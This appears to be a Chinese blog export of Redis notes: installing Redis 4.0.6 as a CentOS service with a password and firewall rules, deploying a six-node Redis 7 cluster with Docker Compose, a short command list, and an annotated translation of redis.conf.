yum -y install gcc
安装

跳转到redis解压目录下

cd /usr/software/redis-4.0.6

编译安装

make

 将/usr/software/redis-4.0.6/src目录下的文件加到/usr/local/bin目录cd src &amp;&amp; make install

启动redis的三种方式
直接启动
先切换到redis src目录下cd /usr/software/redis-4.0.6/src
直接启动redis
 ./redis-server

如上图：redis启动成功，但是这种启动方式需要一直打开窗口，不能进行其他操作，不太方便。
按 ctrl + c可以关闭窗口。

以后台进程方式启动redis


修改redis.conf文件
cd /usr/software/redis-4.0.6vi redis.conf


将 daemonize no 修改 daemonize yes




指定redis.conf文件启动
cd /usr/software/redis-4.0.6/src./redis-server /usr/software/redis-4.0.6/redis.conf


关闭redis进程
ps -aux | grep redis

kill -9 11753


设置redis为系统服务


在/etc目录下新建redis目录
cd /etcmkdir redis


将 /usr/software/redis-4.0.6/redis.conf 文件复制一份到/etc/redis目录下，并命名为6379.conf
cp /usr/software/redis-4.0.6/redis.conf /etc/redis/6379.conf


将redis的启动脚本复制一份放到/etc/init.d目录下
cp /usr/software/redis-4.0.6/utils/redis_init_script /etc/init.d/redisd


设置redis开机自启动
cd /etc/init.dchkconfig redisd on
出现问题1：
service redisd does not support chkconfig　
看结果是redisd不支持chkconfig
解决方法：vi /etc/init.d/redisd，加入如下两行注释，保存退出
 # chkconfig: 2345 90 10# summary: Redis is a persistent key-value database

注释的意思是：redis服务必须在运行级2，3，4，5下被启动或关闭，启动的优先级是90，关闭的优先级是10。

再次执行开机自启命令，成功
chkconfig redisd on
现在可以直接以服务的形式启动和关闭redis了
再次启动：
 service redisd start
出现问题2：

删除：redis_6379.pid后，再次执行：



关闭
service redisd stop


配置密码登录


修改配置文件，使用密码登录
vi /usr/software/redis-4.0.6/redis.conf

此时，访问redis客户端查询

使用密码后，停止服务会报错：
service redisd stop



修改启动配置文件
vi /etc/init.d/redisd将其中的CLIEXEC -p REDISPORT shutdown改为CLIEXEC -a "3448395502" -p REDISPORT shutdown


防火墙开放端口6179


开启6179
/sbin/iptables -I INPUT -p tcp --dport 6179 -j ACCEPT


保存
/etc/rc.d/init.d/iptables save


centos 7下执行
service iptables save


参考：https://blog.csdn.net/zc474235918/article/details/50974483https://www.cnblogs.com/aqicheng/p/11512153.html
Docker安装Redis集群

集群至少6个节点

集群至少3个主节点
每个主节点至少一个从节点（若一个主节点设置2个从节点，则需要9个节点）


1. 环境准备

redis.conf模板文件redis-cluster.tmpl

# redis端口port ${NODE_PORT}requirepass custom_passwordmasterauth custom_password# 开启集群cluster-enabled yesappendonly yescluster-node-timeout 5000#protected-mode nologlevel noticelogfile /redis/log/redis.logdir /redis/data# 集群节点配置cluster-announce-ip 172.16.163.128cluster-announce-port ${NODE_PORT}cluster-announce-bus-port 1${NODE_PORT}

批量生成节点文件的批处理程序：redis-cluster-config-before.sh

 chmod u+x redis-cluster-config-before.sh 修改可执行权限
#!/bin/bash  # 节点数据for port in $(seq 6381 6386)do  rm -rf /opt/docker/redis-cluster-7.0.0/${port} mkdir -p /opt/docker/redis-cluster-7.0.0/${port}/data;  mkdir -p /opt/docker/redis-cluster-7.0.0/${port}/log;  mkdir -p /opt/docker/redis-cluster-7.0.0/${port}/conf;  chmod 777 /opt/docker/redis-cluster-7.0.0/${port}/conf chmod 777 /opt/docker/redis-cluster-7.0.0/${port}/log chmod 777 /opt/docker/redis-cluster-7.0.0/${port}/data#  export NODE_PORT=${port}#  export NODE_INDEX=`expr ${port} - 6379` #  export NODE_IP=172.19.0.${NODE_INDEX}#  echo ${NODE_IP} ${NODE_PORT} NODE_PORT=${port} envsubst &lt; /opt/docker/redis-cluster-7.0.0/redis-cluster.tmpl &gt; /opt/docker/redis-cluster-7.0.0/${port}/conf/redis.conf;done
2. 创建容器

docker-compose.yml 文件

docker-compose up -d
version: '3.7'services:  redis_6381:    image: 'redis:7.0.0'    container_name: redis_6381    privileged: true    restart: always    command:      redis-server /usr/local/etc/redis/redis.conf    volumes:      - ./6381/conf/redis.conf:/usr/local/etc/redis/redis.conf      - ./6381/data:/redis/data      - ./6381/log:/redis/log    ports:      - "6381:6381"      - "16381:16381"    redis_6382:    image: 'redis:7.0.0'    container_name: redis_6382    privileged: true    restart: always    command:      redis-server /usr/local/etc/redis/redis.conf    volumes:      - ./6382/conf/redis.conf:/usr/local/etc/redis/redis.conf      - ./6382/data:/redis/data      - ./6382/log:/redis/log    ports:      - "6382:6382"      - "16382:16382"  redis_6383:    image: 'redis:7.0.0'    container_name: redis_6383    privileged: true    restart: always    command:      redis-server /usr/local/etc/redis/redis.conf    volumes:      - ./6383/conf/redis.conf:/usr/local/etc/redis/redis.conf      - ./6383/data:/redis/data      - ./6383/log:/redis/log    ports:      - "6383:6383"      - "16383:16383"  redis_6384:    image: 'redis:7.0.0'    container_name: redis_6384    privileged: true    restart: always    command:      redis-server /usr/local/etc/redis/redis.conf    volumes:      - ./6384/conf/redis.conf:/usr/local/etc/redis/redis.conf      - ./6384/data:/redis/data      - ./6384/log:/redis/log    ports:      - "6384:6384"      - "16384:16384"  redis_6385:    image: 'redis:7.0.0'    container_name: redis_6385    privileged: true    restart: always    command:      redis-server /usr/local/etc/redis/redis.conf    volumes:      - ./6385/conf/redis.conf:/usr/local/etc/redis/redis.conf      - ./6385/data:/redis/data      - ./6385/log:/redis/log    ports:      - "6385:6385"      - "16385:16385"  redis_6386:    image: 'redis:7.0.0'    container_name: redis_6386    privileged: true    restart: always    command:      redis-server /usr/local/etc/redis/redis.conf    volumes:      - ./6386/conf/redis.conf:/usr/local/etc/redis/redis.conf      - ./6386/data:/redis/data      - ./6386/log:/redis/log    ports:      - "6386:6386"      - "16386:16386"
3. 防火墙
开放6381-6386 16381-16386端口

Urban ufw allow 6381 然后查看 ufw status
Linux   firewall-cmd --zone=public --add-port=6381/tcp --permanent 然后查看 firewall-cmd --zone= public --query-port=6381/tcp

4.  集群配置

进入其中一个节点的容器命令行：docker exec -it redis_6382 bash
集群各个节点自动分配：redis-cli -a custom_password --cluster create 172.16.163.128:6381 172.16.163.128:6382 172.16.163.128:6383 172.16.163.128:6384 172.16.163.128:6385 172.16.163.128:6386 --cluster-replicas 1
集群测试：redis-cli -a custom_password --cluster check 172.16.163.128:6381
集群健康：redis-cli -c -h 172.16.163.128 -p 6381 -a custom_password进入容器，查看cluster info

]]></content>
      <categories>
        <category>数据库</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis-命令记录</title>
    <url>/20221103/709af9d4.html</url>
    <content><![CDATA[KEY的命名
用:分隔不同的层次命名空间，如：user:id12345:contact
如果某个对象有字段的字段，用.连接。如user:id12345:contact.mail。
基础命令记录



命令
使用
说明




SWAPDB
SWAPDB index1 index2 
库index1 和 库index2的数据交换


EXISTS
EXISTS key
判断key是否存在


TTL
TTL key
查询key的过期时间


EXPIRE
EXPIRE key seconds  /  EXPIREAT key timestamp




]]></content>
      <categories>
        <category>数据库</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis-配置文件</title>
    <url>/20230208/6b8605c4.html</url>
    <content><![CDATA[官方模板文件
参考：https://redis.io/docs/management/config-file/
各版本参数变更：https://docs.aws.amazon.com/zh_cn/AmazonElastiCache/latest/red-ug/ParameterGroups.Redis.html
具体配置项
INCLUDES：引入自定义配置文件
如果你有一个适用于所有Redis服务器的标准模板，但也需要自定义一些每个服务器的设置，可以使用 include  配置
选项include不会被命令CONFIG REWRITE从管理或Redis哨兵重写。由于Redis总是使用最后处理的行作为配置指令的值，你最好把include放在配置文件的开头，以避免在运行时覆盖配置更改。
################################## INCLUDES #################################### include /path/to/local.conf# include /path/to/other.conf# include /path/to/fragments/*.conf
MODULES
在启动时加载模块。如果服务器不能加载模块，它将中止。可以使用多个loadmodule指令。
通过Redis Module可以扩展Redis本身的能力，能够实现一些Redis本身不支持的命令
################################## MODULES ###################################### loadmodule /path/to/my_module.so# loadmodule /path/to/other_module.so
NETWORK：网络配置
################################## NETWORK ###################################### 默认情况下，如果没有指定bind配置指令，Redis将监听来自主机上所有可用网络接口的连接。# 可以使用bind配置指令监听一个或多个选定的接口，后面跟着一个或多个IP地址。# 不可用仅指不对应于任何网络接口的地址。已经在使用的地址将总是失败，不支持的协议将无法访问。# Examples:## bind 192.168.1.100 10.0.0.1     # listens on two specific IPv4 addresses# bind 127.0.0.1 ::1              # listens on loopback IPv4 and IPv6# bind * -::*                     # like the default, all available interfaces## ~~~ WARNING ~~~ # 如果运行Redis的计算机直接暴露在互联网上，绑定到所有接口是危险的，并将实例暴露给互联网上的每个人。# 所以默认情况下，我们取消注释下面的bind指令，这将迫使Redis只监听IPv4和IPv6(如果可用)环回接口地址(这意味着Redis将只能接受来自其运行的同一主机的客户端连接)。## 如果您确定希望您的实例侦听所有接口,注释掉下面一行。# 您还需要设置密码，除非您显式禁用protected模式。# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~bind 127.0.0.1 -::1# 默认情况下，传出连接(从副本到主，从哨兵到实例，集群总线等)不会绑定到特定的本地地址。# 在大多数情况下，这意味着操作系统将基于路由进行处理和连接通过的接口。## 使用bind-source-addr可以配置要绑定的特定地址,这也可能影响连接的路由方式。举例:# bind-source-addr 10.0.0.1# 保护模式是一层安全保护层, 默认启用。# 为了避免打开的Redis实例在互联网上被访问和利用。当开启保护模式且默认用户没有密码时，服务器会自动关闭。protected-mode yes# Redis使用默认的加固安全配置指令来减少攻击无辜用户。因此，几种敏感配置指令是不可变的，一些潜在危险的命令会被阻塞。# 控制Redis写入文件的配置指令(例如，'dir' 和'dbfilename')，并且通常不会在运行时修改。通过使它们不可变来保护它们。# 通过设置，这些可以暴露给所有连接，也可以只暴露给本地连接# 下面列出的每一个配置到这些值中的任意一个:## no    - 阻塞任何连接(保持不可变)# yes   - 允许任何连接(无保护)# local - 只允许本地连接. Ones originating from the IPv4 address (127.0.0.1), IPv6 address (::1) or Unix domain sockets.## enable-protected-configs no# enable-debug-command no# enable-module-command no# 接受指定端口上的连接，默认为6379 (IANA #815344).# IANA: https://www.iana.org 互联网地址编码分配机构# 如果指定了端口0,Redis将不会监听TCP套接字。port 6379# TCP listen() backlog.## 在每秒请求数高的环境中，您需要大量的积压，以避免客户端连接速度慢的问题。# 请注意，Linux内核会将其静默地截断为/proc/sys/net/core/somaxconn的值（cat /proc/sys/net/core/somaxconn）# 因此请确保同时提高somaxconn和tcp_max_syn_backlog（cat /etc/sysctl.conf）的值，以便获得所需的效果。tcp-backlog 511# Unix socket.# 指定用于侦听传入连接的Unix套接字的路径。没有默认值，所以如果没有指定，Redis将不会监听unix套接字。## unixsocket /run/redis.sock# unixsocketperm 700# 在客户端空闲N秒后关闭连接(0为禁用)timeout 0# TCP keepalive.## 如果非零，在没有通信的情况下使用SO_KEEPALIVE向客户端发送TCP ACKs。这很有用，有两个原因:# 1) 检测失效节点# 2) 强制中间的网络设备认为连接是活的。## 在Linux操作系统中，该值(单位为秒)为发送ACK的周期。注意，关闭连接需要两倍的时间。在其他内核上，周期取决于内核配置。# 这个选项的合理值是300秒。从Redis 3.2.1开始，是新的Redis默认值tcp-keepalive 300# 应用操作系统特有的机制，用指定的ID标记监听套接字，以支持高级路由和过滤功能。## 在Linux上，ID表示一个连接标记# 在FreeBSD上，ID表示套接字cookie ID。# 在OpenBSD上，ID表示路由表ID。# 默认值是0，这意味着不需要标记。# socket-mark-id 0
TLS/SSL
################################# TLS/SSL ###################################### 默认情况下，TLS/SSL协议处于禁用状态。要启用它，可以使用“tls-port”配置指令定义tls侦听端口。port指定了0，则不再监听TCP套接字。# 在默认端口上启用TLS，请使用:# port 0# tls-port 6379# 配置X.509证书和私钥，用于对连接的客户端、主节点或集群对等体进行服务器身份验证。这些文件应该是PEM格式的。# tls-cert-file redis.crt# tls-key-file redis.key# 如果KEY文件是使用密码短语加密的，那么它也可以包含在这里。# tls-key-file-pass secret# 通常Redis对服务器功能(接受连接)和客户端功能(从主服务器复制，建立集群总线连接等)使用相同的证书。# 有时颁发证书时带有将其指定为仅客户端证书或仅服务器证书的属性。在这种情况下，可能需要对传入(服务器)和传出(客户端)连接使用不同的证书。要做到这一点，请使用以下指令:# tls-client-cert-file client.crt# tls-client-key-file client.key# 如果KEY文件是使用密码短语加密的，那么它也可以包含在这里。# tls-client-key-file-pass secret# 配置DH参数文件，开启 DH (Diffie-Hellman) KEY交换功能，这是旧版本OpenSSL(&lt;3.0)的要求。新版本不需要这种配置，建议不要这样做。# tls-dh-params-file redis.dh# 配置CA证书包或目录以验证TLS/SSL客户端和对等体。Redis需要至少其中一个的显式配置，并且不会隐式地使用系统范围的配置。# tls-ca-cert-file ca.crt# tls-ca-cert-dir /etc/ssl/certs# 默认情况下，TLS端口上的客户端(包括副本服务器)需要使用有效的客户端证书进行身份验证。# - no：则不需要且不接受客户端证书。# - optional：则接受客户端证书，并且在提供时必须有效，但不是必需的。# tls-auth-clients no# tls-auth-clients optional# 默认情况下，Redis副本不会尝试与其主服务器建立TLS连接。使用下面的指令在复制链路上启用TLS。# tls-replication yes# 默认情况下，Redis集群总线使用普通TCP连接. 要为总线协议启用TLS，请使用以下指令:# tls-cluster yes# 默认情况下，只启用TLSv1.2和TLSv1.3，强烈建议禁用旧的正式弃用版本，以减少攻击面。# 您可以显式地指定要支持的TLS版本。允许的值不区分大小写，包括 “TLSv1”，“TLSv1.1”，“TLSv1.2”，"TLSv1.3" (OpenSSL &gt;= 1.1.1) 或者任意组合.# 如果只启用TLSv1.2和TLSv1.3，请使用:# tls-protocols "TLSv1.2 TLSv1.3"# 配置允许的密码。有关此字符串语法的更多信息，请参阅 cipher (1ssl) 手册（ 此配置仅适用于&lt;= TLSv1.2）# tls-ciphers DEFAULT:!MEDIUM# 配置允许使用的TLSv1.3密码套件。有关此字符串语法的更多信息，特别是关于TLSv1.3密码套件的信息，请参阅 cipher (1ssl) 手册# tls-ciphersuites TLS_CHACHA20_POLY1305_SHA256#在选择密码时，使用服务器的首选项而不是客户端首选项。默认情况下，服务器遵循客户端的首选项。# tls-prefer-server-ciphers yes# 默认情况下，启用TLS会话缓存，以允许支持TLS会话缓存的客户端更快、更便宜地重新连接。使用下面的指令禁用缓存。# tls-session-caching no# 修改TLS缓存的默认会话数。零值将缓存设置为无限大小。默认大小为20480。# tls-session-cache-size 5000# 修改TLS缓存会话的默认超时时间。缺省超时时间为300秒。# tls-session-cache-timeout 60
GENERAL：通用设置
################################# GENERAL ###################################### 默认情况下，Redis不作为守护进程运行。如果需要，配置为 “yes”# Note that Redis will write a pid file in /var/run/redis.pid when daemonized.# 注意，Redis会在文件 /var/run/redis.pid 中写入守护时的 pid# 当Redis被upstart或systemd监控时，该参数无影响。daemonize no# 如果你从upstart或systemd运行Redis, Redis可以与你的supervision tree交互。这些监督方法只是表明“流程已经准备好了”。他们不允许连续的ping回你的supervisor。# 选项:#   - no      - no supervision interaction#   - upstart - signal upstart by putting Redis into SIGSTOP mode requires "expect stop" in your upstart job config#   - systemd - signal systemd by writing READY=1 to $NOTIFY_SOCKET on startup, and updating Redis status on a regular basis.#   - auto    - detect upstart or systemd method based on UPSTART_JOB or NOTIFY_SOCKET environment variables## 默认为 “no”。要在 upstart/systemd下运行，你可以简单地取消下面这行代码的注释:# supervised auto# 如果指定了pid文件，Redis在启动时将其写入指定的位置，并在退出时删除它。## 如果在配置中没有指定pid文件，那么当服务器运行时，不会创建pid文件。# 当服务器被守护时，即使没有指定pid文件，也会使用pid文件，默认为 "/var/run/redis.pid"。## 正常创建一个pid文件是最好的结果:如果Redis不能创建它，没有什么不好的事情发生，服务器将正常启动和运行。# 注意，在现代Linux系统中，"/run/redis.pid" 更符合要求，应该用它来代替。pidfile /var/run/redis_6379.pid# 指定服务器日志级别# - debug：有很多信息，对开发/测试很有用# - verbose：许多极少用到的信息，但不像调试级别那样混乱# - notice：合理冗余, 但可能是在生产中需要的# - warning：只记录非常重要/关键的消息loglevel notice# 指定日志文件名。# 空字符串也可以用来强制Redis登录到标准输出。# 注意，如果使用标准输出进行日志记录，但是使用daemonize，那么日志将被发送到/dev/nulllogfile ""# 要启用系统日志记录器，只需将'syslog-enabled'设置为yes，并可选地更新其他系统日志参数以满足您的需要# syslog-enabled no# 指定系统日志标识。# syslog-ident redis# 系统日志记录的级别，必须为USER或LOCAL0-LOCAL7之间。# syslog-facility local0# 要禁用内建的崩溃日志（它可能会在需要时产生更干净的core dumps），取消注释如下:# crash-log-enabled no# 要禁用作为崩溃日志一部分的运行时快速内存检查（这可能会让redis更快地终止），取消以下注释:# crash-memcheck-enabled no#设置数据库数量。默认数据库是 DB 0，您可以使用select &lt;dbid&gt;在每个连接的基础上选择一个不同的数据库，其中dbid是从0开始计数databases 16# 默认情况下，Redis只在开始记录到标准输出，并且标准输出是TTY, 系统日志记录被禁用，时显示ASCII艺术徽标# 基本上，这意味着徽标通常只在交互会话中显示。# 然而，通过将以下选项设置为yes，可以强制4.0之前的行为，并始终在启动日志中显示ASCII艺术徽标。always-show-logo no# 默认情况下，Redis修改进程标题(如'top'和'ps'所示)以提供一些运行时信息。# 通过将以下设置为no，可以禁用此功能并保留进程名为已执行。set-proc-title yes# 当更改流程标题时，Redis使用以下模板来构造修改后的标题。模板变量用花括号指定。支持如下变量:## {title}           父进程时执行的进程名，或子进程的类型# {listen-addr}     绑定地址或 "*"，后面跟着TCP或TLS端口监听，或Unix套接字(如果有的话)# {server-mode}     特殊模式, 例如. "[sentinel]" or "[cluster]"# {port}            TCP监听端口，或0# {tls-port}        TLS监听端口, or 0.# {unixsocket}      Unix套接字监听端口, or "".# {config-file}     使用的配置文件名称.#proc-title-template "{title} {listen-addr} {server-mode}"# 设置用于字符串比较操作的本地环境，也会影响Lua脚本的性能。空字符串表示区域设置是由环境变量派生的。# Set the local environment which is used for string comparison operations, and  also affect the performance of Lua scripts. locale-collate ""
SNAPSHOTTING：快照

################################ SNAPSHOTTING  ################################# 将DB数据保存到磁盘# save &lt;seconds&gt; &lt;changes&gt; [&lt;seconds&gt; &lt;changes&gt; ...]## 经过给定秒数（seconds），且对DB的写操作超过了给定数量（changes），Redis将保存DB。# 快照可以通过一个空字符串参数完全禁用，如下例所示:## save ""## 默认情况下Redis会保存DB#   - 3600 1： 在3600秒(一小时)之后，至少执行了一次更改#   - 300 100： 在300秒(五分钟)之后，至少执行了100次更改#   - 60 10000： 在60秒(一分钟)之后，至少执行了10000次更改# 您可以通过取消注释下面的行显式地设置这些参数# save 3600 1 300 100 60 10000# 默认情况下，如果RDB快照启用(至少一个保存点) 并且最近的后台保存失败，Redis将停止接受写入。# 这将使用户意识到(以一种艰难的方式)数据没有正确地持久化在磁盘上，否则很可能没有人会注意到，从而发生一些灾难。# 如果后台保存进程重新开始工作，Redis将自动允许再次写入。## 但是，如果你已经设置了适当的Redis服务器监控和持久化，你可能想要禁用这个功能，这样即使有磁盘、权限等问题，Redis也会继续正常工作。stop-writes-on-bgsave-error yes# 默认启用：当保存快照文件（RDB数据库）时，使用LZF压缩字符串对象。# 如果你想在save child中节省一些CPU，将其设置为 "no"，但如果你有可压缩的值或键，数据集可能会更大。rdbcompression yes# 从RDB版本5开始，CRC64校验和被放在文件的末尾。# 这使得格式更能抵抗损坏，但在保存和加载RDB文件时，会有性能损失(大约10%)，因此您可以禁用它以获得最大性能。# 创建的RDB文件时，禁用校验或者校验和为零，将告诉加载代码跳过该检查rdbchecksum yes# loading an RDB or RESTORE payload 时，允许或禁止对 ziplist 或者 listpack 等进行 full sanitization checks# 这降低了稍后在处理命令时发生断言或崩溃的可能性。# Options:#   no         - 从不执行 full sanitization#   yes        - 总是执行 full sanitization#   clients    - 仅对用户连接执行full sanitization.#                排除: RDB 文件, 从主连接接收到的RESTORE命令, 和具有skip-cleanup-payload ACL标志的客户端连接.# 默认值应该是'clients'，但由于它目前会影响通过MIGRATE进行集群重分片，因此默认情况下暂时设置为'no'。## sanitize-dump-payload no# 配置快照文件名dbfilename dump.rdb# 在未启用持久性的情况下，删除实例中复制使用的RDB文件# 默认情况下，该选项是禁用的，但是在某些环境下，出于法规或其他安全考虑，应该尽快删除由master保存在磁盘上以提供副本，或由副本存储在磁盘上以加载它们以进行初始同步的RDB文件。# 注意，此选项仅在同时禁用了AOF和RDB持久性的实例中有效，否则将完全忽略。## 获得相同效果的另一种(有时更好)方法是在主实例和副本实例上使用无磁盘复制。但是，在副本实例的环境下，无磁盘并不总是一种选择。rdb-del-sync-files no# 快照工作目录# dbfilename配置的快照文件，将被写入这个目录中# Append Only产生的文件也将在此目录中创建。## 注意，这里必须指定目录，而不是文件名。dir ./
REPLICATION：主从复制
################################# REPLICATION ################################## Master-Replica 复制. 使用replicaof使一个Redis实例成为另一个Redis服务器的副本。 # 关于Redis复制需要尽快了解的一些事情##   +------------------+      +---------------+#   |      Master      | ---&gt; |    Replica    |#   | (receive writes) |      |  (exact copy) |#   +------------------+      +---------------+## 1) Redis复制是异步的，但是你可以配置一个主服务器，如果它没有与至少给定数量的副本连接，它就会停止接受写操作# 2) 如果复制链路在相对较短的时间内丢失，Redis副本能够与主服务器执行部分再同步。您可能需要配置复制backlog大小(请参阅此文件的下一节)，并根据您的需要设置合理的值。# 3) 复制是自动的，不需要用户干预，在网络分区之后，副本会自动尝试重新连接到主节点并与它们重新同步。## replicaof &lt;masterip&gt; &lt;masterport&gt;# 如果主机有密码保护 ( “requirepass” 配置指令) 可以在启动同步复制进程之前告诉副本进行身份验证, 否则主服务器将拒绝副本请求。## masterauth &lt;master-password&gt;## 然而，如果你正在使用Redis ACL，这是不够的(适用于Redis版本6或更高版本), 默认用户不能执行PSYNC命令和/或复制所需的其他命令。# 在这种情况下，最好配置一个特殊用户用于复制，并指定主用户配置如下:## masteruser &lt;username&gt;## 当指定了masteruser时，副本将使用新的AUTH表单对其主服务器进行身份验证: AUTH &lt;username&gt; &lt;password&gt;.# 当一个副本失去了与主服务器的连接，或者当复制仍在进行时，副本可以以两种不同的方式工作:# 1) 如果 replica-serve-stale-data 配置为"yes"(默认) 副本仍然会回复客户端请求, 可能有过时的数据, 如果这是第一次同步，则数据集可能为空.# 2) 如果 replica-serve-stale-data 配置为"no", 副本会返回给所有请求一下错误信息："MASTERDOWN Link with MASTER is down and replica-serve-stale-data is set to 'no'", 除了以下命令: INFO, REPLICAOF, AUTH, SHUTDOWN, REPLCONF, ROLE, CONFIG, SUBSCRIBE, UNSUBSCRIBE, PSUBSCRIBE, PUNSUBSCRIBE, PUBLISH, PUBSUB, COMMAND, POST, HOST and LATENCY.#replica-serve-stale-data yes# 您可以配置副本实例是否接受写操作。# 针对副本实例写入可能有助于存储一些临时数据(因为写入副本的数据在与主服务器重新同步后很容易被删除)，但如果客户端由于错误配置而写入副本，也可能导致问题。## Redis 2.6 版本之后默认副本是只读的。# Note: 只读副本不会被设计成暴露给互联网上不受信任的客户端。它只是防止实例被滥用的保护层。# 默认情况下，只读副本仍然可输出所有管理类命令，如CONFIG、DEBUG等。在有限的范围内，您可以使用'rename-command'来隐藏所有管理的、危险的命令，从而提高只读副本的安全性。replica-read-only yes# 副本同步策略: 磁盘同步或套接字同步。# 新的副本和重新连接的副本不能继续复制过程，只是接收差异，需要做所谓的“完全同步”。## RDB文件从主服务器传输到副本。有两种不同的传输方式:# 1) Disk-backed: Redis主进程创建一个新进程，将RDB文件写入磁盘。随后，父进程将文件增量地传输到副本#                 当RDB文件生成时，允许更多的副本排队，只要当前生成RDB文件的子进程完成了它的工作，排队的副本们便可以用生成的RDB文件提供服务# 2) Diskless: Redis主进程创建一个新进程，直接将RDB文件写入复制套接字，而不需要任何磁盘操作。#              使用无磁盘复制时，一旦传输开始，新的副本将进入队列，当当前传输终止时，新的传输将开始 #              当使用无盘复制时，主服务器在开始传输之前等待一段可配置的时间(以秒为单位)，希望有多个副本到达，并行传输数据。#              对于慢磁盘和快速(大带宽)网络，无磁盘复制工作得更好repl-diskless-sync yes# 当启用无磁盘复制时，为了生成 通过套接字将RDB传输到副本 的子节点，可以配置服务器等待时间# 这很重要，因为一旦传输开始，就不可能为新的副本提供服务，这些副本将排队等待下一个RDB传输，因此服务器等待延迟以让更多副本到达。## 延迟以秒为单位指定，默认为5秒。要完全禁用它，只需将其设置为0秒，传输将尽快开始。repl-diskless-sync-delay 5# 当使用延迟启用无磁盘复制时，如果期望的最大副本数量已连接，则可以在达到最大延迟之前让复制启动。# 默认为0意味着没有定义最大副本数量，Redis将等待全部延迟。repl-diskless-sync-max-replicas 0# -----------------------------------------------------------------------------# WARNING: 由于在这种设置中，副本不会立即在磁盘上存储RDB，因此在故障转移期间可能会导致数据丢失。# RDB无盘加载+ Redis模块不处理I/O读取可能会导致Redis在与主同步的初始阶段出现I/O错误时中止。# -----------------------------------------------------------------------------# Replica可以直接从套接字加载它从复制链路读取的RDB，或者将RDB存储到一个文件中，在从master完全接收到RDB后再读取该文件。## 在许多情况下，磁盘比网络慢，存储和加载RDB文件可能会增加复制时间(甚至增加主服务器的Copy on Write内存和副本缓冲区)。# 然而，当直接从套接字解析RDB文件时，为了避免数据丢失，只有当新数据集在内存中完全加载时才会安全地刷新当前数据集，从而导致更高的内存使用量。# 因此，我们有以下选择:## "disabled"    - 不要使用无磁盘加载(先将rdb文件存储到磁盘)# "swapdb"      - 在直接从套接字解析数据时，将当前db内容保存在RAM中。#                 在此模式下的副本可以在复制进行时继续服务当前数据集，除非它们无法将主服务器识别为具有来自相同复制历史的数据集#                 注意，这需要足够的内存，如果没有内存，就有OOM kill的风险# "on-empty-db" - 仅当当前数据集为空时使用无磁盘加载. #                 这样更安全，可以避免在复制期间同时加载新旧数据集。repl-diskless-load disabled# 主机在预定义的时间间隔内向其副本发送ping。可以使用repl_ping_replica_period选项更改这个间隔。缺省值是10秒。## repl-ping-replica-period 10# 以下选项设置的复制超时时间:# 1) 从副本的角度来看，同步期间的批量传输I/O# 2) 从副本(data, ping)的角度看主节点超时# 3) 从主节点的角度看副本超时(REPLCONF ACK ping)# 确保这个值大于为repl-ping-replica-period指定的值是很重要的，否则每次在主服务器和副本之间有低流量时都会检测到超时。缺省值是60秒。## repl-timeout 60# 在SYNC之后禁用副本套接字上的TCP_NODELAY ?#  - yes： Redis将使用更少的TCP数据包和更少的带宽将数据发送到副本。但是这可能会增加数据在副本端出现的延迟，对于使用默认配置的Linux内核，延迟最长可达40毫秒。#  - no： 则数据出现在副本端的延迟将减少，但复制将使用更多带宽。# 默认情况下，我们优化低延迟，但在非常高的流量条件下，或者当主服务器和副本相隔很多跳时，将此选项变为“yes”可能是一个好主意。repl-disable-tcp-nodelay no# 设置复制backlog大小。backlog是一个缓冲区，当副本断开连接一段时间后，它会积累副本数据，因此当副本想再次重新连接时，通常不需要完全重新同步，部分重新同步就足够了，只需传递断开连接时副本错过的部分数据。# 复制backlog越大，副本能够忍受断开的时间就越长，并且以后能够执行部分重新同步。# 只有当至少连接了一个副本时，才分配backlog。## repl-backlog-size 1mb# 主服务器在一段时间内没有连接的副本后，积压将被释放。# 下面的选项配置需要经过的秒数，从最后一个副本断开连接的时间开始，以释放积压缓冲区。# 请注意，副本永远不会因为超时而释放积压，因为它们可能稍后会升级为主副本，并且应该能够正确地与其他副本“部分重新同步”:因此它们应该总是积累积压。## 值为0意味着永远不释放待办事项。## repl-backlog-ttl 3600# 副本优先级是Redis在INFO输出中发布的整数。它是由Redis哨兵，在主服务器不再正常工作，选择要提升为主服务器的副本时使用# 优先级低的副本被认为更适合升级，例如，如果有三个优先级为10，100,25的副本，哨兵会选择优先级为10的副本，这是最低的。# 然而，优先级为0的副本标志着该副本不能执行master角色，因此优先级为0的副本将永远不会被Redis Sentinel选中进行升级。## 缺省情况下，优先级为100。replica-priority 100# 传播错误行为控制了当Redis无法处理来自主机的复制流中正在处理的命令时，它将如何表现。传播过程中发生的错误是意外的，并可能导致数据不一致。然而，在早期版本的Redis中存在一些边缘情况，服务器可能会复制或保留在未来版本中失败的命令。因此，默认行为是忽略此类错误并继续处理命令。# 如果应用程序希望确保没有数据分歧，则应该将此配置设置为'panic'。该值还可以设置为'panic-on-replicas'，仅当副本在复制流上遇到错误时才恐慌。一旦有足够的安全机制来防止误报崩溃，这两个恐慌值中的一个将成为未来的默认值。## propagation-error-behavior ignore# 副本忽略磁盘写错误控制副本在无法将从主服务器接收到的写命令持久化到磁盘时的行为。# 默认情况下，这个配置被设置为'no'，在这种情况下会使副本崩溃。不建议更改这个默认值，但是为了与旧版本的Redis兼容，这个配置可以切换为“yes”，这将只是记录一个警告，并执行从master得到的写命令。## replica-ignore-disk-write-errors no# -----------------------------------------------------------------------------# 默认情况下，Redis Sentinel在报告中包含所有副本。一个副本可以排除在Redis哨兵的公告。一个未通知的副本将被'sentinel replicas &lt;master&gt;'命令忽略，并且不会暴露给Redis sentinel的客户端。# 该选项不会改变复制优先级的行为。即使replica-announce设置为“no”，副本也可以提升为主副本。为了防止这种情况发生，请将replica-priority设置为0。## replica-announced yes# 如果连接的副本少于N个，主服务器有可能停止接受写操作，延迟小于或等于M秒。也就是N个副本需要处于“online”状态。# 延迟时间(以秒为单位)必须&lt;=指定的值，是从副本接收到的最后一个ping计算出来的，通常每秒钟发送一次。# 此选项不保证N个副本将接受写入，但将在没有足够的副本可用的情况下将丢失写入的暴露窗口限制为指定的秒数# 例如，需要至少3个副本，延迟&lt;= 10秒使用:## min-replicas-to-write 3# min-replicas-max-lag 10## 将其中一个或另一个设置为0将禁用该特性。# 默认情况下，min-replica-to-write设置为0(禁用功能)，min-replica-max-lag设置为10。# Redis主机能够以不同的方式列出附加副本的地址和端口。# 例如，“INFO 